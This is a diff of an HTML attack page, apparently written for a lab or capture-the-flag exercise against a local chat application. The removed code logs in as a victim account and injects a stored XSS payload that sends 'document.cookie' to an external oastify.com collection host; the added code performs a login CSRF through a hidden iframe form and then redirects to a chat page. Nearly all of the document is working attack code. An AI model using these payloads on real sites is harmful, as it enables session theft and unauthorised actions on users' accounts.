@@ -2,27 +2,19 @@
 <html>
 <body>
 <div class="message">x</div>
+<iframe name="f" style="display:none"></iframe>
 <script>
-// Step 1: Login
-fetch('http://localhost:8000/login', {
-  method: 'POST',
-  credentials: 'include',
-  mode: 'no-cors',
-  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-  body: 'username=vittima3&password=vittima3'
-}).then(() => {
-  // Step 2: Inietta XSS via form submit (non fetch)
-  var form = document.createElement('form');
-  form.method = 'POST';
-  form.action = 'http://localhost:8000/chat/70';
-  var input = document.createElement('input');
-  input.type = 'hidden';
-  input.name = 'message';
-  input.value = '<img src=x onerror="fetch(\'https://d2ghgjts3mukt4luqn2sm92plgr7fz3o.oastify.com/?c=\'+document.cookie)">';
-  form.appendChild(input);
-  document.body.appendChild(form);
-  form.submit();
-});
+var f1 = document.createElement('form');
+f1.method = 'POST';
+f1.action = 'http://localhost/login';
+f1.target = 'f';
+f1.innerHTML = '<input name="username" value="vittima3"><input name="password" value="vittima3">';
+document.body.appendChild(f1);
+f1.submit();
+
+setTimeout(function(){
+  window.location = 'http://localhost/chat/70';
+}, 3000);
 </script>
 </body>
 </html>
